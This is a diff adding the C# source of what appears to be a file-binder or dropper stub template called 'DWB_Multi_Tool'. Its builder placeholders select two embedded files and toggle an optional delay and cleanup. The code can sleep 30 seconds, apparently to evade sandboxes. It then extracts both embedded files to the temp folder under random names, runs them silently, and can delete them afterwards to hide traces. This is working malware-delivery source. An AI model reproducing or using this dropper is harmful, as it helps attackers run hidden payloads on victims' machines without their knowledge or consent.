@@ -1,0 +1,59 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Reflection;
+using System.Threading;
+
+namespace DWB_Multi_Tool
+{
+    class Program
+    {
+		public static void Main(string[] args)
+        {
+            string[] FileNames = { "%FILENAME1%", "%FILENAME2%" };
+            string RandomChars = "DroppedFile2wdwww543" + DateTime.Now.Millisecond;
+
+            if ("%DELAY%" == "TRUE")
+            {
+                Thread.Sleep(30000);
+            }
+
+            Directory.SetCurrentDirectory(Path.GetTempPath());
+
+            for (int i = 0; i < 2; i++)
+            {
+                ExtractResource(FileNames[i], RandomChars + FileNames[i]);
+                Process.Start(RandomChars + FileNames[i]);
+            }
+
+            if ("%DELETE%" == "TRUE")
+            {
+                Thread.Sleep(15000);
+
+                try
+                {
+                    for (int i = 0; i < 2; i++)
+                    {
+                        File.Delete(RandomChars + FileNames[i]);
+                    }
+                } catch
+                {
+
+                }
+            }
+
+            Environment.Exit(0);
+        }
+
+        public static void ExtractResource(string FileName, string Name)
+        {
+            Assembly assembly = Assembly.GetCallingAssembly();
+            using (Stream stream = assembly.GetManifestResourceStream(FileName))
+            {
+                byte[] bytes = new byte[(int)stream.Length];
+                stream.Read(bytes, 0, bytes.Length);
+                File.WriteAllBytes(Name, bytes);
+            }
+        }
+    }
+}
